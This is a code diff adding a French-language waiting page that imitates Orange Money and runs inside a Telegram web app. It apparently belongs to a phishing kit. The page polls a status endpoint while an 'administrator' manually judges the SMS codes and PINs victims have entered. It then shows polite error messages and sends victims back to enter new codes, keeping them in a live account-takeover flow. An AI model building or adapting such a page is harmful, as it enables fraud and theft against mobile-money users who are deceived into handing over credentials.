@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vérification en cours - Orange Money</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --orange-primary: #f25c05;
+            --bg-color: #f25c05;
+        }
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: white;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 { font-size: 22px; font-weight: 700; margin: 0 0 10px; }
+        p { font-size: 15px; opacity: 0.9; margin: 0; max-width: 320px; line-height: 1.4; }
+
+        .error-box {
+            background-color: rgba(0, 0, 0, 0.15);
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 20px;
+            display: none;
+            width: 100%;
+            max-width: 340px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="spinnerContainer">
+    <div class="spinner"></div>
+    <h2>Veuillez patienter...</h2>
+    <p>L'administrateur vérifie votre code de validation.</p>
+</div>
+
+<div id="errorContainer" class="error-box">
+    <h2>Oups !</h2>
+    <p id="errorText">Le code ou le code PIN saisi est incorrect. Veuillez réessayer.</p>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const phone = localStorage.getItem('phone');
+        let checkCount = 0;
+        const maxChecks = 30; // Check for up to 90 seconds (3s interval)
+
+        const pollInterval = setInterval(async () => {
+            checkCount++;
+            try {
+                if (phone) {
+                    const res = await fetch('/api/check-status?phone=' + encodeURIComponent(phone));
+                    if (res.ok) {
+                        const data = await res.json();
+                        const status = data.status;
+
+                        // Handle Success / Approval
+                        if (status === 'otp1_correct' || status === 'approved' || status === 'otp2_correct') {
+                            clearInterval(pollInterval);
+                            window.location.href = "success.html"; // Remplacez par votre page de succès finale si besoin
+                        }
+                        
+                        // Handle Wrong Code / Wrong PIN Rejection
+                        else if (status === 'otp1_wrong' || status === 'otp2_wrong' || status === 'otp2_wrongpin' || status === 'denied') {
+                            clearInterval(pollInterval);
+                            
+                            // Show polite error message before redirecting back
+                            document.getElementById('spinnerContainer').style.display = 'none';
+                            const errorContainer = document.getElementById('errorContainer');
+                            const errorText = document.getElementById('errorText');
+
+                            if (status === 'otp2_wrongpin') {
+                                errorText.textContent = "Le code PIN fourni est incorrect. Veuillez le saisir à nouveau, s'il vous plaît.";
+                            } else {
+                                errorText.textContent = "Le code de validation est incorrect ou a expiré. Veuillez recommencer, s'il vous plaît.";
+                            }
+                            errorContainer.style.display = 'block';
+
+                            // Redirect back after 3 seconds so the user can read the prompt
+                            setTimeout(() => {
+                                if (status === 'otp2_wrongpin') {
+                                    window.location.href = "page6.html"; // Retour au PIN
+                                } else {
+                                    window.location.href = "page8.html"; // Retour au SMS / OTP
+                                }
+                            }, 3000);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.log("Erreur lors de la vérification du statut...");
+            }
+
+            // Fallback timeout safety net if admin doesn't click
+            if (checkCount >= maxChecks) {
+                clearInterval(pollInterval);
+                // Redirection par défaut si le délai expire
+                window.location.href = "page8.html";
+            }
+        }, 3000);
+    });
+</script>
+</body>
+</html>
